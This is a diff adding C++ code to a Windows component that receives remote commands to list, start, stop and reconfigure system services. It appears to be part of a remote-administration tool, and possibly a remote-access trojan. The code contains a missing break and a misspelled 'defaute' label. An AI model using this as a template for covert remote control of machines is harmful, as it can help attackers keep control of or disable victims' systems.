@@ -169,3 +169,125 @@ void CServerManager::SendServicesList()
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
+
+void CServerManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
+{
+	switch (lpBuffer[0])
+	{
+	case COMMAND_SERVICELIST:
+		SendServicesList();
+		break;
+	case COMMAND_SERVICECONFIG:
+		ServiceConfig((LPBYTE)lpBuffer + 1, nSize - 1);
+		break;
+	default:
+		break;
+	}
+}
+
+void CServerManager::ServiceConfig(LPBYTE lpBuffer, UINT nSize)
+{
+	BYTE COMMAND = lpBuffer[0];
+	char *m_ServiceName = (char *)(lpBuffer + 1);
+
+	switch (COMMAND)
+	{
+	case COMMAND_SERVICES_START:	//start
+	{
+		SC_HANDLE hSCManager1 = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+		if (NULL != hSCManager1)
+		{
+			SC_HANDLE hService1 = OpenService(hSCManager1, m_ServiceName, SERVICE_ALL_ACCESS);
+			if (NULL != hService1)
+			{
+				StartService(hService1, NULL, NULL);
+				CloseServiceHandle(hService1);
+			}
+			CloseServiceHandle(hSCManager1);
+		}
+		Sleep(500);
+		SendServicesList();
+	}
+	break;
+
+	case COMMAND_SERVICES_STOP:	//stop
+	{
+		SC_HANDLE hSCManager4 = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+		if (NULL != hSCManager4)
+		{
+			SC_HANDLE hService4 = OpenService(hSCManager4, m_ServiceName, SERVICE_ALL_ACCESS);
+			if (NULL != hService4)
+			{
+				SERVICE_STATUS stat;
+				ControlService(hService4, SERVICE_CONTROL_STOP, &stat);
+				CloseServiceHandle(hService4);
+			}
+			CloseServiceHandle(hSCManager4);
+		}
+		Sleep(500);
+		SendServicesList();
+	}
+	break;
+	case COMMAND_SERVICES_AUTO:	//auto
+	{
+		SC_HANDLE hSCManager2 = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+		if (NULL != hSCManager2)
+		{
+			SC_HANDLE hService2 = OpenService(hSCManager2, m_ServiceName, SERVICE_ALL_ACCESS);
+			if (NULL != hService2)
+			{
+				SC_LOCK sclLock2 = LockServiceDatabase(hSCManager2);
+				BOOL stat2 = ChangeServiceConfig(
+					hService2,
+					SERVICE_NO_CHANGE,
+					SERVICE_AUTO_START,
+					SERVICE_NO_CHANGE,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL);
+				UnlockServiceDatabase(sclLock2);
+				CloseServiceHandle(hService2);
+			}
+			CloseServiceHandle(hSCManager2);
+		}
+		Sleep(500);
+		SendServicesList();
+	}
+	break;
+	case COMMAND_SERVICES_MANUAL: // DEMAND_START
+	{
+		SC_HANDLE hSCManager3 = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+		if (NULL != hSCManager3)
+		{
+			SC_HANDLE hService3 = OpenService(hSCManager3, m_ServiceName, SERVICE_ALL_ACCESS);
+			if (NULL != hService3)
+			{
+				SC_LOCK sclLock3 = LockServiceDatabase(hSCManager3);
+				BOOL stat3 = ChangeServiceConfig(
+					hService3,
+					SERVICE_NO_CHANGE,
+					SERVICE_DEMAND_START,
+					SERVICE_NO_CHANGE,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL,
+					NULL);
+				UnlockServiceDatabase(sclLock3);
+				CloseServiceHandle(hService3);
+			}
+			CloseServiceHandle(hSCManager3);
+		}
+		Sleep(500);
+		SendServicesList();
+	}
+defaute:
+	break;
+	}
+}
